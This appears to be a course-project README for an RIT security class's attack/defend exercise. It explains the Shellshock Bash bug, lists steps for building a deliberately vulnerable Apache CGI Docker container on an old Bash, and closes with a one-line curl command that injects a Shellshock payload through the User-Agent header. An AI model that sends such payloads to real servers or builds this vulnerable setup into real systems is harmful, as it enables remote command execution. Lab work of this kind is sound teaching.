# CSEC-742-Project
**Attack Defend Exercise for Computer System Security (RIT CSEC-742)**

**Gain understanding and experience with vulnerabilities and exploitation**

Construct a vulnerable system for others to attack and configure a monitoring system to observe attacks. Set up a VM, configure it to be susceptible to an exploit, and connect it to the private subnet in the RIT Virtual Lab Environment. Attack other students' infrastructures to discover their vulnerabilities, observe attacks against your infrastructure, and create offensive and defensive reports reviewing the techniques you used or observed.

## Timeline
- Part 1: Exploit working (11/1)
- Part 2: Monitoring working (11/11)
- Part 3: Competition (11/13-11/25)
- Part 4: Writeups - Offensive and Defensive (11/29)
- Part 5: Comments and feedback for classmates (12/9)

## Exploit Overview
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Shellshock-bug.png/1024px-Shellshock-bug.png" alt="Shellshock Logo" width="100"/>

**[Shellshock (CVE-2014-6271)](https://www.exploit-db.com/exploits/34765)**

Shellshock is a group of security bugs in Unix’s default Bash (Bourne-Again) shell which allow for a user to run arbitrary code on vulnerable devices that they can connect to. These vulnerabilities were discovered between September 12th and September 24th, 2014 with patches being co-developed by vulnerability researchers and the Bash maintainers prior to disclosure.  The initial discovery showed that Bash would unintentionally execute commands when they were concatenated to the end of function definitions stored in the values of environment variables. There were many ways that the bug could be leveraged, including via the internet through unpatched web servers, SSH servers, DHCP clients, and mail servers. Attackers began exploiting Shellshock within hours of disclosure, attacking various entities such as Akamai, Yahoo!, and the United States Department of Defense.

## Implementation Details

### Docker-Compose:
[Docker Hub](https://hub.docker.com/r/wwt92829/csec-472-project)
```
version: '3'

services:

  server:
    image: wwt92829/csec-472-project
    container_name: server
    ports:
      - "80:80"
```
1. Download a vulnerable version of Bash (this image uses 4.2) from [GNU's website](http://ftpmirror.gnu.org/bash/).
2. Create a web server (this image uses Apache httpd) and enable support for CGI. In httpd.conf:
    - Uncomment  `LoadModule cgid_module modules/mod_cgid.so` and `LoadModule cgi_module modules/mod_cgi.so`
    - Uncomment `ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"`
3. Create and frame a shell script with `Content-type: text/html` in an HTML file. The shell script should be stored in the cgi-bin directory specified in httpd.conf.
4. Build a Dockerfile from the [httpd](https://hub.docker.com/_/httpd) Docker image.
    - Update the package lists and install dependencies
    - Downgrade Bash by installing the old version with dpkg
    - Copy httpd.conf to the apache2/conf directory
    - Copy the HTML file with the framed shell script to the htdocs or /var/www/html directory
    - Set the shell script as executable using chmod and place it in the cgi-bin directory
5. Create a Docker-Compose file to build the container and expose the desired port on the host to the container's port 80.

### Run exploit:
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls ../htdocs;'" http://<ip address>/cgi-bin/toucan
```
